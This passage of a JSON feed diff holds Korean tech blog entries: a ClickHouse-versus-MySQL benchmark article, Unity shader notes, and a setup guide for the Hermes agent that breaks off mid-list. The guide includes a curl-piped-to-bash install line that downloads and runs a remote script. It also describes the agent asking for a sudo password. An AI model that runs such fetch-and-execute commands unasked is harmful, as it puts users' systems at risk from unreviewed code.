service_id, DATE(created_at), event_type;\r\r\n```\r\r\n\r\r\n 적용 추천: 정산, 정기 리포트, 매출 분석\r\r\n\r\r\n\r\r\n\r\r\n## ClickHouse 부적합 케이스\r\r\n\r\r\nClickHouse가 맞지 않는 패턴도 확인해야 합니다. 다음과 같은 상황에서는 MySQL을 그대로 사용하는 것을 권장합니다.\r\r\n\r\r\n\r\r\n\r\r\n### 1. 단건 조회/단건 INSERT\r\r\n\r\r\n```\r\r\nSELECT * FROM users WHERE user_id = 12345;\r\r\n```\r\r\n\r\r\n앞서 살펴본 바와 같이 ClickHouse는 데이터를 열(Column) 단위로 저장합니다. 열 저장 구조는 같은 타입의 데이터가 연속으로 모여 있어야 압축도 잘 되고 집계도 빠릅니다. 반대로 단건 조회는 `id, name, age, amount`처럼 서로 다른 칼럼을 각각 따로 찾아서 조합해야 합니다. 열이 흩어져 있으니 오히려 더 많은 I/O가 발생합니다.\r\r\n\r\r\nINSERT도 마찬가지입니다. ClickHouse는 대량 배치 INSERT에 최적화되어 있습니다. 열 단위로 데이터를 모아서 한꺼번에 압축 저장하기 때문에 건별 INSERT는 비효율적입니다. 1건씩 INSERT하면 매번 새로운 파트(Part)가 생성되어 오히려 성능이 크게 저하됩니다.\r\r\n\r\r\n즉 ClickHouse는 \"많이 모아서 한 번에\"에 특화된 DB이며, 단건 조회/INSERT처럼 \"하나씩 처리\"하는 패턴에는 MySQL이 적합합니다.\r\r\n\r\r\n\r\r\n\r\r\n### 2. 트랜잭션(결제, 주문 등)\r\r\n\r\r\n```\r\r\nBEGIN;\r\r\nUPDATE orders SET status = 'paid' WHERE order_id = 999;\r\r\nUPDATE stock SET quantity = quantity - 1 WHERE item_id = 1;\r\r\nCOMMIT;\r\r\n```\r\r\n\r\r\nClickHouse는 트랜잭션을 지원하지 않습니다. 이는 ClickHouse가 의도적으로 선택한 트레이드오프입니다. 속도를 얻기 위해 정확도(정합성)를 일부 포기한 설계입니다. MySQL은 ACID(원자성·일관성·격리성·지속성)를 보장해 결제 도중 오류가 나면 전체가 롤백 되고, 데이터는 항상 일관된 상태를 유지합니다. ClickHouse는 이 복잡한 정합성 보장 대신 \"빠르게 많이 쓰고, 빠르게 많이 읽는다\"에 집중했습니다. 덕분에 수천만\\~수억 건의 집계를 초 단위로 처리할 수 있습니다.\r\r\n\r\r\n결제, 주문처럼 \"틀리면 안 되는\" 작업은 MySQL, 통계, 분석처럼 \"빠르게 봐야 하는\" 작업은 ClickHouse를 사용하면 효과적입니다.\r\r\n\r\r\n\r\r\n\r\r\n### 3. 빈번한 UPDATE/DELETE\r\r\n\r\r\n```\r\r\nUPDATE orders SET status = 'cancel' WHERE order_id = 999;\r\r\nDELETE FROM logs WHERE created_at < '2023-01-01';\r\r\n```\r\r\n\r\r\nClickHouse에서 UPDATE/DELETE는 동작 구조가 MySQL과 다릅니다.\r\r\n\r\r\n\r\r\n\r\r\n**UPDATE**\r\r\n\r\r\n→ `ReplacingMergeTree` 엔진으로 대체 동일 키로 새 데이터를 INSERT 하면 백그라운드에서 중복을 제거하는 방식입니다.\r\r\n\r\r\n→ 즉시 반영이 안 되고 Merge 타이밍에 처리됩니다.\r\r\n\r\r\n**DELETE**\r\r\n\r\r\n→ `Mutation`으로 동작(`ALTER TABLE ... DELETE WHERE ...`)\r\r\n\r\r\n→ 해당 파트를 통째로 재작성하는 방식이므로 처리 비용이 크고 속도가 느립니다. 소량 건별 삭제에는 부적합합니다.\r\r\n\r\r\n\r\r\n\r\r\n기술적으로 불가능한 것은 아니지만, 빈번한 단건 UPDATE/DELETE에는 설계 자체가 맞지 않습니다. 이런 패턴은 MySQL이 적합합니다.\r\r\n\r\r\n\r\r\n\r\r\n## MySQL vs ClickHouse 성능 테스트 비교\r\r\n\r\r\n이 테스트는 \"ClickHouse가 잘하는 영역(집계, 대용량 분석)에서 실제로 얼마나 차이가 나는지\"를 확인하기 위한 목적으로 진행했습니다. 앞서 설명한 대로 두 DB는 경쟁 관계가 아니라 역할이 다릅니다. ClickHouse의 도입 필요성을 판단하기 위한 참고 수치로 활용하시기 바랍니다. 실제 도입 시에는 서비스의 쿼리 패턴에 맞는 스키마와 정렬 키 설계가 선행되어야 합니다.\r\r\n\r\r\n\r\r\n\r\r\n**1. 서버 스펙**\r\r\n\r\r\n| 항목 | MySQL 서버 | ClickHouse 서버 | 비고 |\r\r\n| --- | --- | --- | --- |\r\r\n| CPU | 16코어 | 16코어 | taskset으로 동일하게 맞춤 |\r\r\n| MEM(RAM) | 64GB | 64GB | 동일 |\r\r\n| 디스크 | HDD 8.7TB | HDD 1TB | 타입 동일 |\r\r\n\r\r\n**2. 테스트 조건**\r\r\n\r\r\n| 항목 | 내용 |\r\r\n| --- | --- |\r\r\n| 데이터 | 5,000만 건 이벤트 로그(6개 칼럼) |\r\r\n| 측정 방식 | 3회 반복 측정 후 중간값 채택 |\r\r\n| 데이터 범위 | 2023-01-01 \\~ 2024-12-31(2년치) |\r\r\n\r\r\n**3. 테스트 테이블 스키마**\r\r\n\r\r\nMySQL은 구조상 PK가 필수이며, 행을 유일하게 식별하는 고유 식별자로 동작합니다.\r\r\n\r\r\nClickHouse의 PK는 개념이 다릅니다. ORDER BY로 지정한 정렬 키가 PK 역할을 하며, 고유성 보장이 아닌 데이터 탐색 범위를 줄이기 위한 용도로 사용됩니다.\r\r\n\r\r\n```\r\r\n-- MySQL\r\r\nCREATE TABLE IF NOT EXISTS events (\r\r\n    id          BIGINT AUTO_INCREMENT PRIMARY KEY,\r\r\n    user_id     BIGINT NOT NULL,\r\r\n    service_id  INT NOT NULL,\r\r\n    event_type  VARCHAR(20) NOT NULL,\r\r\n    amount      DECIMAL(15,2) NOT NULL,\r\r\n    status      VARCHAR(10) NOT NULL,\r\r\n    created_at  DATETIME NOT NULL,\r\r\n    PRIMARY KEY (`id`),\r\r\n    INDEX idx_created_at_service_event (created_at, service_id, event_type)\r\r\n    -- MySQL은 구조상 PK가 필수이기 때문에 id 칼럼을 PK로 두되, ClickHouse의 ORDER BY 정렬 키와 동일한 구성으로 복합 인덱스를 별도 생성하여 조건을 맞춤\r\r\n) ENGINE=InnoDB;\r\r\n\r\r\n\r\r\n-- ClickHouse\r\r\nCREATE TABLE events (\r\r\n    id          UInt64,\r\r\n    user_id     UInt64,\r\r\n    service_id  UInt32,\r\r\n    event_type  LowCardinality(String),\r\r\n    amount      Decimal(15,2),\r\r\n    status      LowCardinality(String),\r\r\n    created_at  DateTime\r\r\n)\r\r\nENGINE = MergeTree()\r\r\nORDER BY (created_at, service_id, event_type);\r\r\n-- ORDER BY = 정렬 키. 쿼리 필터 조건과 맞출수록 성능 향상\r\r\n```\r\r\n\r\r\n\r\r\n\r\r\n같은 데이터, 같은 쿼리이지만 결과는 달랐습니다.\r\r\n\r\r\n\r\r\n\r\r\n### 테스트 1. 집계 쿼리 속도(핵심)\r\r\n\r\r\n\r\r\n\r\r\n**쿼리 A: GROUP BY 단일 — 월별 금액 합산**\r\r\n\r\r\n```\r\r\nSELECT DATE_FORMAT(created_at, '%Y-%m'), SUM(amount)\r\r\nFROM events\r\r\nGROUP BY 1 ORDER BY 1;\r\r\n```\r\r\n\r\r\n| 항목 | MySQL | ClickHouse | 차이 |\r\r\n| --- | --- | --- | --- |\r\r\n| 실행 시간 | 49초 | 0.2초 | 약 245배 빠름 |\r\r\n\r\r\n\r\r\n\r\r\n**쿼리 B: GROUP BY 다중 — 서비스별 + 날짜별 + 타입별 3중 집계**\r\r\n\r\r\n```\r\r\nSELECT service_id, DATE(created_at), event_type, COUNT(*), SUM(amount)\r\r\nFROM events\r\r\nWHERE created_at BETWEEN '2024-01-01' AND '2024-12-31'\r\r\nGROUP BY 1, 2, 3;\r\r\n```\r\r\n\r\r\n| 항목 | MySQL | ClickHouse | 차이 |\r\r\n| --- | --- | --- | --- |\r\r\n| 실행 시간 | 208초(=3분28초) | 0.3초 | 약 693배 빠름 |\r\r\n\r\r\n\r\r\n\r\r\n**쿼리 C: COUNT — 조건부 카운트 + DISTINCT**\r\r\n\r\r\n```\r\r\nSELECT event_type, status,\r\r\n       COUNT(*), COUNT(DISTINCT user_id), SUM(IF(amount > 50000, 1, 0))\r\r\nFROM events\r\r\nWHERE created_at BETWEEN '2024-06-01' AND '2024-12-31'\r\r\nGROUP BY event_type, status;\r\r\n```\r\r\n\r\r\n| 항목 | MySQL | ClickHouse | 차이 |\r\r\n| --- | --- | --- | --- |\r\r\n| 실행 시간 | 67초 | 0.2초 | 약 335배 빠름 |\r\r\n\r\r\n\r\r\n\r\r\n**쿼리 D: MySQL View vs ClickHouse View**\r\r\n\r\r\n| 항목 | MySQL View | ClickHouse View | 차이 |\r\r\n| --- | --- | --- | --- |\r\r\n| 실행 시간 | 94초 | 0.398초 | 약 236배 빠름 |\r\r\n\r\r\nClickHouse는 MySQL과 마찬가지로 VIEW를 제공합니다. 원리는 같지만, ClickHouse는 데이터를 열(column) 단위로 저장하는 구조 덕분에 집계 쿼리 시 필요한 열만 읽어 I/O를 최소화합니다. 같은 VIEW 개념임에도 MySQL 대비 약 236배 빠른 성능을 보입니다.\r\r\n\r\r\n\r\r\n\r\r\n**추가: ClickHouse Materialized View 활용**\r\r\n\r\r\n| 항목 | ClickHouse View | ClickHouse Materialized View | 차이 |\r\r\n| --- | --- | --- | --- |\r\r\n| 실행 시간 | 0.398초 | 0.1초 | 약 4배 빠름 |\r\r\n\r\r\nClickHouse에서 성능을 더 끌어올리고 싶다면 Materialized View(MV)를 활용할 수 있습니다.\r\r\n\r\r\n일반 View가 조회 시점마다 원본 테이블을 다시 읽는 반면, MV는 데이터가 INSERT 될 때 집계를 미리 계산해 별도 테이블에 저장합니다.\r\r\n\r\r\n조회 시에는 이미 집계된 결과를 바로 반환하기 때문에 0.398초 → 0.1초로 추가 단축됩니다. 대시보드처럼 동일한 집계를 반복 조회하는 서비스에 특히 효과적입니다.\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n### 테스트 2. 동시 요청 처리(집계 쿼리 10개 동시 실행)\r\r\n\r\r\n| 항목 | MySQL | ClickHouse |\r\r\n| --- | --- | --- |\r\r\n| 최소 응답시간 | 약 48초 | 약 0.3초 |\r\r\n| 최대 응답시간 | 약 48초 | 약 0.9초 |\r\r\n| 평균 응답시간 | 약 48초 | 약 0.9초 |\r\r\n\r\r\nMySQL과 달리 ClickHouse는 병렬 처리 구조로 10개 동시 요청도 안정적으로 응답합니다.\r\r\nMySQL은 동시 요청 10개에 48초, ClickHouse는 0.9초. 같은 쿼리입니다.\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n### 테스트 3. 저장 용량(압축률)\r\r\n\r\r\n| 항목 | MySQL | ClickHouse | 절감 |\r\r\n| --- | --- | --- | --- |\r\r\n| 5,000만 건 데이터 용량 | 5.6GB | 2.6GB | 약 54% |\r\r\n\r\r\nClickHouse는 열(column) 단위 저장 + LZ4 압축 덕분에 같은 데이터를 훨씬 작게 저장합니다.\r\r\n스토리지 비용 절감은 물론, 디스크 I/O가 줄어 쿼리 속도에도 직접 영향을 줍니다.\r\r\n\r\r\n\r\r\n\r\r\n### 테스트 4. INSERT 속도(대량 적재)\r\r\n\r\r\n| 항목 | MySQL | ClickHouse | 차이 |\r\r\n| --- | --- | --- | --- |\r\r\n| 5,000만 건 적재 시간 | 849초(14분) | 49초 | 약 17배 빠름 |\r\r\n\r\r\nMySQL은 약 14분, ClickHouse는 1분 이내에 완료되었습니다.\r\r\nMySQL은 행 단위로 데이터를 즉시 디스크에 쓰고 인덱스를 갱신하지만, ClickHouse는 데이터를 메모리에 모아 열 단위로 일괄 압축한 뒤 디스크에 한 번에 씁니다. 여기에 멀티 코어 병렬 처리까지 더해져 대량 적재에서 빠른 속도를 냅니다.\r\r\n\r\r\n\r\r\n\r\r\n### 테스트 5. MySQL 호환성\r\r\n\r\r\n| 검증 항목 | MySQL 문법 그대로 CH에서 실행 | 결과 일치 |\r\r\n| --- | --- | --- |\r\r\n| DATE\\_FORMAT, 날짜 함수 | 동작 | 일치 |\r\r\n| IF / CASE WHEN | 동작 | 일치 |\r\r\n| LIKE / IN / BETWEEN | 동작 | 일치 |\r\r\n| HAVING + 서브쿼리 | 동작 | 일치 |\r\r\n| MySQL Client(포트 7004) 접속 | 접속 성공 | \\- |\r\r\n\r\r\n동일 문법, 동일 결과로 쿼리 동일성을 검증했습니다.\r\r\nMySQL에 익숙하다면, ClickHouse 쿼리 문법 자체에 대한 진입 장벽은 낮습니다.\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n## NHN Cloud의 ClickHouse 활용 케이스\r\r\n\r\r\n### 1. Notification Hub\r\r\n\r\r\nNHN Cloud의 [Notification Hub](https://www.nhncloud.com/kr/service/notification/notification-hub)는 SMS, Email, Push 등 다양한 채널로 메시지를 발송·관리하는 통합 메시징 서비스입니다.\r\r\n\r\r\n카카오 비즈센터에서 제공하는 통계 API는 다양한 검색 조건으로 통계를 조회하는 기능을 제공하지 않습니다.\r\r\n\r\r\n이에 따라 카카오 비즈센터의 전체 통계 데이터를 ClickHouse에 저장한 뒤, Notification Hub 고객에게 다양한 검색 조건으로 통계를 조회할 수 있도록 제공하는 구조로 구성했습니다. 이는 Notification Hub 전체 발송 통계에 ClickHouse를 적용하기 앞서, 서비스 안정성을 검증하기 위한 PoC(proof of concept, 개념 증명) 목적으로 카카오 통계에 먼저 도입했습니다.\r\r\n\r\r\nClickHouse 도입 후 달라진 점은 크게 네 가지입니다.\r\r\n\r\r\n> **1\\) 적재 파이프라인 단순화** - MySQL에서 필요했던 사전 전처리·병합 과정이 사라지고, raw 데이터를 그대로 적재하는 단순한 구조로 바뀌었습니다.\r\r\n>\r\r\n> **2\\) 데이터 보정 편의성 향상** - ReplacingMergeTree 엔진을 활용해 멱등성을 보장합니다. 기존 데이터를 삭제하지 않고도 보정 데이터를 추가할 수 있고, 중복 적재가 발생해도 문제가 없습니다.\r\r\n>\r\r\n> **3\\) 누락 데이터 확인 용이** - 병합 전 raw 데이터가 그대로 쌓이기 때문에, 어떤 데이터가 누락됐는지 훨씬 빠르게 파악할 수 있습니다.\r\r\n>\r\r\n> **4\\) 조회 성능 향상** - 1,000만 건 이상의 데이터에 다양한 필터 조건으로 집계 쿼리를 수행했을 때 356ms 수준의 응답 속도를 확인했습니다. 사전 전처리 없이 조회 시점에 집계하는 방식으로도 충분히 서비스를 제공할 수 있음을 검증했습니다. 카카오 통계 PoC를 통해 안정성과 성능을 확인한 만큼, 이후 Notification Hub 전체 발송 통계로의 확대 적용도 검토 중입니다.\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n### 2. Cab-Verify\r\r\n\r\r\nCAB은 NHN Cloud의 상품·프로젝트 라이프사이클 등을 관리하는 Framework이며, Cab-Verify는 CAB에서 사용하는 인증을 관리하는 서비스입니다. 현재 최대 1억 건의 토큰 인증 이력을 보관하고 있으며, CAB 7.0 API 토큰 인증 의무화·도입 상품 수 증가·퍼블릭 API 확대로 향후 10억 건 이상으로 증가가 예상되는 상황이었습니다. \r\r\n\r\r\nMySQL로는 이 규모를 감당하기 어렵다는 판단 아래 ClickHouse 도입을 진행했습니다. 토큰 인증 이력 데이터를 ClickHouse에 적재하여 대규모 인증 이력 통계 조회를 고성능으로 처리하고, 향후 10억 건 규모로 확대되더라도 안정적인 조회 성능을 확보하는 것이 목표입니다.\r\r\n\r\r\n\r\r\n\r\r\n### 3. Resource Watcher\r\r\n\r\r\nNHN Cloud의 [Resource Watcher](https://www.nhncloud.com/kr/service/governance-audit/resource-watcher)는 NHN Cloud의 로그 플랫폼 개발팀에서 직접 ClickHouse를 도입하여 운영 중인 사례입니다. MySQL에서 반복적으로 발생하던 슬로 쿼리 문제를 ClickHouse로 해결한 경험을 공유해 주셨습니다.\r\r\n\r\r\nFramework에서는 하루 한 번 resource 목록을 배치로 조회하는 과정에서 Resource Watcher의 MySQL에 슬로 쿼리가 반복 발생했습니다. CPU 사용량이 95%를 초과하면서 MySQL이 헬스 체크(health check)에 응답하지 못하는 상황이 발생했고, 이로 인해 DB role change(failover, 장애 조치)가 발생할 위험이 있었습니다.\r\r\n\r\r\n배치 조회 트래픽을 ClickHouse로 분리하여 MySQL의 부하를 제거했습니다. 기존 API를 ClickHouse 기반 신규 API로 교체하고, 쿼리도 기존 3개에서 1개로 통합했습니다. 결과적으로 반복 발생하던 슬로 쿼리가 해소되었고, 배치 조회가 서비스 트래픽에 영향을 주지 않는 구조로 개선되었습니다.\r\r\n\r\r\n> **1\\) MySQL 슬로 쿼리 해소** - DB CPU 부하 및 장애 조치(failover) 위험을 제거했습니다.\r\r\n>\r\r\n> 2\\) 배치 조회와 서비스 트래픽의 DB 레벨 격리 - 배치와 서비스가 각각 다른 DB를 바라보도록 분리하여 서로 영향을 주지 않고 독립적으로 동작합니다.\r\r\n>\r\r\n> 3\\) 쿼리 구조 개선으로 조회 성능 향상 - LIMIT/OFFSET 쿼리 수행 시 발생하던 성능 문제가 개선되었습니다.\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n## 타사 ClickHouse 사용 사례\r\r\n최근에는 많은 기업들이 다양한 목적으로 ClickHouse를 도입해 사용하고 있습니다. 대표적인 사례를 소개합니다.\r\r\n\r\r\n\r\r\n| 회사 | 도입 목적 | 처리 규모 | 핵심 성과 |\r\r\n| --- | --- | --- | --- |\r\r\n| 카카오페이 증권 | 로그 플랫폼 전환 (OpenSearch → ClickHouse) | 일 41TB, 200억 건 로그 | 비용 85% 절감, 지연 20초 이내 |\r\r\n| 토스 | 랭킹 서비스 개선 | 인기 랭킹 시간당 1억 건 로그 | 실시간 랭킹 제공 (1초 미만 응답) |\r\r\n| SK텔레콤 | 고객 여정 데이터를 기반으로 한 사내 서비스 개선 | 2억 건 가량의 고객 행동 데이터 | 응답 10초 이내 |\r\r\n| Netflix | 대용량 로그 핫 티어 | 일 5PB, 초당 1,060만 이벤트 | 로그 생성 후 20초 이내 검색 가능 |\r\r\n| LINE Yahoo Japan | Kafka 인프라 모니터링 | 초당 700만 행 | 24대 서버로 전사 인프라 관측성 확보 |\r\r\n\r\r\n* [https://tech.kakaopay.com/post/pallas-v2-log-platform/](https://tech.kakaopay.com/post/pallas-v2-log-platform/)\r\r\n* [https://www.youtube.com/watch?v=8P2OL7cwFEU](https://www.youtube.com/watch?v=8P2OL7cwFEU)\r\r\n* [https://devocean.sk.com/blog/techBoardDetail.do?ID=167943\\&boardType=techBlog](https://devocean.sk.com/blog/techBoardDetail.do?ID=167943&boardType=techBlog)\r\r\n* [https://clickhouse.com/blog/netflix-petabyte-scale-logging](https://clickhouse.com/blog/netflix-petabyte-scale-logging)\r\r\n* [https://clickhouse.com/jp/blog/line-yahoo-jp](https://clickhouse.com/jp/blog/line-yahoo-jp)\r\r\n* [https://clickhouse.com/user-stories](https://clickhouse.com/user-stories)\r\r\n\r\r\n\r\r\n\r\r\n## 마치며\r\r\n지금까지 ClickHouse가 무엇인지, MySQL과 대비하여 구조적으로 어떻게 다르고 왜 빠른지 알아보았습니다. 나아가 설계 철학부터 다른 두 데이터베이스를 각각 어떤 케이스에 활용하면 적합한지 살펴보았고, 실제로 ClickHouse를 활용하는 사례들을 소개했습니다.\r\r\nMySQL의 집계 쿼리 성능 한계로 슬로 쿼리와 타임아웃을 자주 마주하시는 분들, ClickHouse에 관심이 있으시거나 도입을 고려하시는 분들 등 많은 분들께 도움이 되길 바라며 글을 마치겠습니다. 긴 글을 읽어 주셔서 감사합니다. \r\r\n\r\r\n\r\r\n[![NHN Cloud_meetup banner_footer_202509.png](https://image.toast.com/aaaadh/real/2026/techblog/NHN%20Cloudmeetup%20bannerfooter202509.png)](https://www.nhncloud.com/kr)",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://meetup.nhncloud.com/posts/414",
+    "pubDate": "Mon, 11 May 2026 00:12:36 GMT",
+    "creator": "Unknown",
+    "categories": []
+  },
+  {
     "id": 8,
+    "imageUrl": "",
+    "title": "유니티 build-in 셰이더를 URP 로 변환하기",
+    "description": "나중엔 안쓰게 되겠지만 \n계속 이런일이 발생하네요 배워둘수 밖에 ...\n \n영상: https://www.youtube.com/watch?v=uKn2S7e-moI&t=306s\n\n\n\n \nbuilt-in 으로 작업하다 최근들어 URP 가 계속 영역을 늘리고 있어써\n메뉴 파악을 해두시는게 좋습니다.\n몇년안엔 전부 URP 로 넘어갈태니까 할일이 없겠지만\n지금은 과도기라 귀찮은 작업을 해줘야합니다.\n안에 셰이더 변환 메뉴 위치와\n셰이더 코드 수정 방법등을 알려줍니다.\n \n \n이게 1편이군요 \n위에 영상 하나만봐도 되는데\n이론 들으실분은 이것도 보시는게 좋겠습니다.\n영상: https://www.youtube.com/watch?v=vrmmBuGn77o",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://serverdown.tistory.com/1644",
+    "pubDate": "Fri, 8 May 2026 20:35:01 +0900",
+    "creator": "SID-NFT",
+    "categories": [
+      "urp",
+      "셰이더",
+      "유니티"
+    ]
+  },
+  {
+    "id": 9,
+    "imageUrl": "",
+    "title": "기초 / 물리기반 랜더링에 대해 알아보자",
+    "description": "PBR 이라고도 하는데\n3D 게임엔진의 기본 셰이더는 이걸 구현해뒀습니다.\n \n유니티 Standard 셰이더에 전부 있는 값들인데\n이게 뭔지는 잘 모르르 수 있습니다.\n결과적으로 실사 셰이더는 Standard 만 사용하면 다 표시할 수 있으니\n용어는 기억해둡시다.\n \n영상: https://www.youtube.com/watch?v=saEHAd9nzyA",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://serverdown.tistory.com/1647",
+    "pubDate": "Sun, 10 May 2026 10:52:37 +0900",
+    "creator": "SID-NFT",
+    "categories": [
+      "프로그래밍/개발메모"
+    ]
+  },
+  {
+    "id": 10,
+    "imageUrl": "",
+    "title": "헤르메스 에이전트 개발배경, 설치 및 사용방법",
+    "description": "이 글은 헤르메스 에이전트 개발 배경, 설치, 사용방법 등을 나눔한다.\n\n\n\n\n개요\n헤르메스는 서버리스로 자체 로컬 컴퓨터에 설치할 수 있는 에이전트이다. 스스로 발전할 수 있도록 구현되어 있어, 지식을 계속 축척하고 이를 재사용할 수 있다. 헤르메스 프로젝트는 중앙 집중형 AI의 한계를 극복하기 위해 NOUS RESEARCH - Open Source AI에 의해 개발되었다. 누스 리서치는 특정 기업의 이익보다 오픈소스 AI 모델의 성능 향상과 보급을 목적으로 하는 연구 커뮤니티이자 조직이다. 이들은 이미 AI 오픈소스 프로젝트를 통해 세계 AI 개발자들 사이에서 신뢰를 쌓아왔다. 특정 기업에 종속된 클라우드 기반 AI와 달리, 사용자의 로컬 환경에서 독립적으로 작동하는 주권적 AI(Sovereign AI)구현을 목표로 한다. 개발팀은 사용자가 자신의 하드웨어 자원을 활용해 보안 걱정 없이 고성능 AI 비서를 운용할 수 있는 생태계를 구축하고자 이 에이전트를 세상에 내놓았다.\n\n\n헤르메스 에이전트의 공식 정보와 최신 소스 코드는 공식 깃허브(GitHub) 저장소 및 프로젝트 웹사이트를 통해 제공된다. 개발자들과의 원활한 소통 및 기술 지원은 주로 디스코드(Discord) 커뮤니티나 관련 포럼을 통해 이루어지며, 이곳에서 사용자는 최신 업데이트 소식과 문제 해결 방법을 공유받을 수 있다.\n\n\n헤르메스 에이전트는 현재 매우 빠른 속도로 발전 중이다. 초기에는 단순한 텍스트 기반 응답에 집중했으나, 현재는 도구 사용(Tool Use), 웹 브라우징, 그리고 장기 기억(Long-term Memory) 기능을 통합하여 복잡한 태스크를 수행할 수 있는 수준에 도달했다. 특히 오픈소스 커뮤니티의 활발한 참여로 인해 다양한 로컬 LLM(대규모 언어 모델)과의 호환성이 강화되고 있으며, 최적화 작업을 통해 사양이 낮은 개인용 PC에서도 원활하게 구동될 수 있도록 경량화가 진행되고 있다.\n\n\n설치 방법\n설치는 리눅스에서 다음과 같이 실행한다.\ncurl -fsSL https://raw.githubusercontent.com/NousResearch/hermes-agent/main/scripts/install.sh | bash\n\n\n\n\n\n만약 이전에 Open claw 에이전트를 설치했다면, 해당 설정을 임포트할 것인지 다음과 같이 질문한다. 본인은 오픈 클로 설치할때 사용할 LLM모델 등을 미리 설정하였기 때문에, 이 설정 정보를 그대로 가져오기로 했다. \n\n\n\n\n이제 헤르메스 설정이 진행된다. 본인의 경우, 신속 설정 모드를 선택하였다. \n\n\n대부분 디폴트값으로 설정한다. 그럼, 다음과 같이 마지막에 설정 수정 명령과 함께 에이전트 실행할 지 물어본다. 엔터를 눌러 실행한다. \n\n\n그럼, 다음과 같은 화면을 볼 수 있을 것이다.\n\n\n다시 Ctrl+D 를 눌러 헤르메스 에이전트를 빠져나온다. \nLLM 모델을 다시 OpenAI Codex로 변경하기 위해 다음 명령을 실행한다.\nhermes setup model\n\n\n\n화면에서 모델로 OpenAI codex 를 선택하면, 설정 단계를 안내한다. 그대로 따라해 본다. \n\n앞의 코덱스 로그인 때 적색 표시로 코덱스 장치 코드 인증 활성화하라는 메시지가 뜰 수 있다. 다음과 같이 오픈AI의 설정 해당 메뉴를 찾아, 그 옵션을 다음 화면과 같이 활성화한다.\n\n\n이제 다시 해당 코덱스 링크를 방문하면, 다음과 같은 화면이 나타날 것이다. 헤르메스에서 알려준 코드 를 입력한다. \n\n이제 헤르메스 모델 설정 터미널 화면에서 다음과 같이 로긴되고 모델 설정 옵션 입력을 받을 것이다. 적절한 모델을 설정한다. 그리고 다시 헤르메스 에이전트를 실행한다.\nhermes\n\n\n헤르메스에 다음과 같이 입력한다.\nhi\n\n\n그럼, 해당 모델을 호출해 다음 화면과 같이 인시할 것이다. \n\n\n\n헤르메스 에이전트 사용하기\n정상적으로 설정되었으니, 헤르메스가 무엇을 할 수 있는 지 다음과 같이 물어보자. \n\n\n\n너는 현재 이 컴퓨터에서 무엇을 할 수 있니?\n\n\n\n그럼, 다음과 같이 답변할 것이다. \n\n\n다음 명령을 입력해 본다. \n\n\n\n컴퓨터 현재 상태 간단히 점검해줘.\n\n\n\n그럼, 헤르메스가 내 컴퓨터 정보를 읽고 다음과 같이 알려줄 것이다. \n\n\n다음과 같이 현재 웹 정보도 검색 가능한지 확인해 보자. \n\n\n현재 전쟁과 주식에 관련된 소식을 웹 검색해바\n\n\n그럼, 헤르메스가 다음과 같이 관련 소식을 검색하기 위한 파이썬 코드를 생성, 실행한 후, 관련 정보를 얻는다. 얻은 정보는 설정된 언어모델을 통해 질문에 대한 답변을 추론해 보여줄 것이다. \n\n\n\n\n\n바이브 코딩도 간단히 해보자. \n\n\n\n코사인 파형이 시간에 따라 흐르는 시뮬레이션을 하는 프로그램 개발해\n\n\n\n그럼, 다음과 같이 코딩하고, 프로그램을 헤르메스가 실행된 폴더에 저장한다. \n\n\n실행하라고 명령을 줘본다.\n\n\n\n실행을 했는데, 코사인 파형이 애니메이션되지 않는다. 제대로 파형이 안보이니 문제 원인을 수정해 달라고한다. 그럼, 다음과 같이 코드를 읽고 수정해 줄것이다.\n\n이제 다시 실행해 본다. 그럼, 다음과 같이 프로그램이 실행될 것이다. \n\n\n이제, 오픈 클로에서 입력햇던 나의 아이덴티티 관련 질문을 해본다. \n\n\n\n내 이름이 머지?\n\n\n\n\n다음과 같이 잘 기억하고 있는 것을 알 수 있다.\n\n\n\n\n앞에서 검색했던 뉴스도 한번 더 보여달라고 해보자. 과거에 명령 조사했던 내용을 기억하고 있는 것을 알 수 있다. \n\n\n\n이외에 주기적으로 서버 관리용 리포트를 생성하는 등의 일들도 시켜본다. \n\n\n\n\n\n\n\n\n헤르메스는 여러 터미널에 에이전트를 실행해고, 서로 협업하게도 할 수 있다. 이런 궁금한 것은 헤르메스에게 물어보면 다음과 같이 실행 순서를 알려준다. 그래서 별도 메뉴얼을 공부할 필요가 없다. \n\n\n\n\n참고로 헤르메스가 알려준 tmux 도구는 터미널 멀티플렉서로 터미널 내에서 여러 터미널 세션을 만들어 특정 프로그램들을 실행하고 창을 닫아도 해당 프로그램 실행 세션이 살아있게 해준다. 다음과 같이 tmux를 설치해 달라고 해보자. 그럼 sudo 암호를 달라고 한 후 apt get install 명령으로 설치해준다. 이런 방식으로 헤르메스에 도움을 요청하면 여러 도구와 명령들을 일일히 기억하지 않아도 되어 참 편리하다.\n\n\n\n\n해르메스 사용 중에 축척한 지식은 어디에 저장되는 지도 확인해 보자. \n\n\n\n\n넌 내가 너를 통해 알아낸 지식을 어디에 어떤 방식으로 저장하니?\n\n\n\n\n다음과 같이 메모리 메커니즘을 잘 설명해 줄 것이다.\n\n\n\n\n멀티 에이전트 실행하기\n\n다양한 멀티 에이전트로 실행하기 위해서 다음 명령을 입력한다. \nhermes kanban init\n\nhermes kanban stats\n\n\n헤르메스 도구를 활성화한다. \n\nhermes tools\n\n\n다음 명령을 입력해 본다. \n\n tmux, kanban 설치 다함. 이제 특정 웹서비스를 개발하기 위한 각 에이전트 멀티로 만들수 있도록 \n각 단계별 알려줘. 요구사항 조사, 설계, 개발, 테스트는 각각 영어이름으로 에이전트 만들어. 하나 \n에이전트가 끝나면, 다른 에이전트가 자동으로 실행될 수 있도록도 설정해줘.\n\n\n\n그럼, 헤르메스가 이를 고려해 명령들을 실행하는 배치파일(쉘 스크립트)를 자동으로 생성해준다. \n\n\n\n\n\n\n\n이외에도 헤르메스가 할 수 있는 것들은 다음과 같다.\n\n\n- 개발\n      - 코드 작성/수정, 버그 디버깅, 테스트 자동화, 성능 점검\n    - 시스템 작업\n      - 프로세스/포트/메모리/디스크 점검, 로그 분석, 서버 실행\n    - 데이터 작업\n      - CSV/JSON 분석, 리포트 요약, 그래프 생성\n    - 웹 리서치\n      - 최신 뉴스/기술 문서/가격 정보 검색 후 핵심 요약\n    - 문서 업무\n      - 보고서/메일/발표자료 초안 작성, 한국어/영어 다듬기\n    - 